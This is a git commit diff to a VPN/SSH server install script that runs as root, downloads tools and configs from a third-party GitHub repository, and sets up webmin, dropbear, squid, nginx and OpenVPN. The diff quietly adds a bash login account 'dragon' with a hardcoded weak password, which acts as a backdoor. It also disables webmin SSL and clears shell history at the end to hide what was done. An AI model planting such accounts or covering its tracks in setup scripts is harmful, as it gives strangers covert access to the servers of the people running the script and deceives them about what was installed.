7e04c46c6bd68c64145827d7e63d008611f256a2
10p26r <31011752+10p26r@users.noreply.github.com>
2017-09-18 23:31:23 +0700

    Update Install.sh

--- Extra/Install.sh
+++ Extra/Install.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
+
 myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
 myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
-cd
 
 if [ $USER != 'root' ]; then
 	echo "Sorry, for run the script please using root user"
@@ -12,53 +12,102 @@ if [[ ! -e /dev/net/tun ]]; then
 	echo "TUN/TAP is not available"
 	exit
 fi
-
-ln -fs /usr/share/zoneinfo/Asia/Thailand /etc/localtime;
-
+echo "
+AUTOSCRIPT RUN
+SETUP BY MKSSHVPN
+WAITING...
+"
+clear
+echo "START AUTOSCRIPT"
+clear
+echo "SET TIMEZONE KUALA LUMPUT GMT +8"
+ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
+clear
+echo "
+ENABLE IPV4 AND IPV6
+COMPLETE 1%
+"
 echo ipv4 >> /etc/modules
 echo ipv6 >> /etc/modules
 sysctl -w net.ipv4.ip_forward=1
 sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
 sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
 sysctl -p
+clear
+
+echo "
+REMOVE SPAM PACKAGE
+COMPLETE 10%
+"
+apt-get -y --purge remove samba*;
+apt-get -y --purge remove apache2*;
+apt-get -y --purge remove sendmail*;
+apt-get -y --purge remove postfix*;
+apt-get -y --purge remove bind*;
+clear
+echo "
+UPDATE AND UPGRADE PROCESS 
+PLEASE WAIT TAKE TIME 1-5 MINUTE
+"
+sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
+wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
+apt-get update;
+apt-get -y upgrade;
+apt-get -y install wget curl;
+echo "
+INSTALLER PROCESS PLEASE WAIT
+TAKE TIME 5-10 MINUTE
+"
+
+#install menu
+wget https://raw.githubusercontent.com/zero9911/a/master/script/menu
+wget https://raw.githubusercontent.com/zero9911/a/master/script/user-list
+wget https://raw.githubusercontent.com/zero9911/a/master/script/monssh
+wget https://raw.githubusercontent.com/zero9911/a/master/script/status
+mv menu /usr/local/bin/
+mv user-list /usr/local/bin/
+mv monssh /usr/local/bin/
+mv status /usr/local/bin/
+chmod +x  /usr/local/bin/menu
+chmod +x  /usr/local/bin/user-list
+chmod +x  /usr/local/bin/monssh
+chmod +x  /usr/local/bin/status
 cd
 
-# Fail2ban & Exim & Protection
+# moth
+cd
+wget https://raw.githubusercontent.com/zero9911/a/master/script/motd
+mv ./motd /etc/motd
+
+# fail2ban & exim & protection
 apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
 wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
 cd ddos-deflate-master && ./install.sh
 service exim4 stop;sysv-rc-conf exim4 off;
-cd
 
-# SQUID
-apt-get -y install squid3
-wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/10p26r/Pritunl/master/Extra/squid.conf"
-sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
-cd
+# webmin
+apt-get -y install webmin
+sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
 
-# MENU
-wget https://raw.githubusercontent.com/10p26r/Pritunl/master/Extra/menu
-wget https://raw.githubusercontent.com/10p26r/Pritunl/master/Extra/user-list
-wget https://raw.githubusercontent.com/10p26r/Pritunl/master/Extra/status
-wget https://raw.githubusercontent.com/10p26r/Pritunl/master/Extra/monssh
-mv menu /usr/local/bin/
-mv user-list /usr/local/bin/
-mv status /usr/local/bin/
-mv monssh /usr/local/bin/
-chmod +x  /usr/local/bin/menu
-chmod +x  /usr/local/bin/user-list
-chmod +x  /usr/local/bin/status
-chmod +x  /usr/local/bin/monssh
-cd
+# ssh
+sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+wget -O /etc/issue.net "https://raw.githubusercontent.com/zero9911/a/master/script/banner"
 
-# Dropbear
+# dropbear
 apt-get -y install dropbear
-wget -O /etc/default/dropbear "https://raw.githubusercontent.com/10p26r/Pritunl/master/Extra/dropbear"
+wget -O /etc/default/dropbear "https://raw.githubusercontent.com/zero9911/a/master/script/dropbear"
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
 cd
 
-# Nginx
+# squid3
+apt-get -y install squid3
+wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/zero9911/a/master/script/squid.conf"
+sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
+cd
+
+# nginx
 apt-get -y install nginx php5-fpm php5-cli libexpat1-dev libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
@@ -70,7 +119,7 @@ wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/zero9911/a
 sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
 cd
 
-# OpenVPN
+# openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
 wget https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
@@ -85,19 +134,29 @@ cd;wget https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/cronj
 tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
 mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
 chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash dragon
+echo "dragon:369" | chpasswd
 echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
 rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 cd
 
 # restart service
+service ssh restart
+service openvpn restart
+service dropbear restart
 service nginx restart
 service php5-fpm restart
-service ssh restart
-service dropbear restart
-service openvpn restart
+service webmin restart
 service squid3 restart
+service fail2ban restart
+
 
 echo "
 
 Install Complete.......
 "
+cat /dev/null > ~/.bash_history && history -c
+rm *.txt
+rm *.sh
+exit
+fi
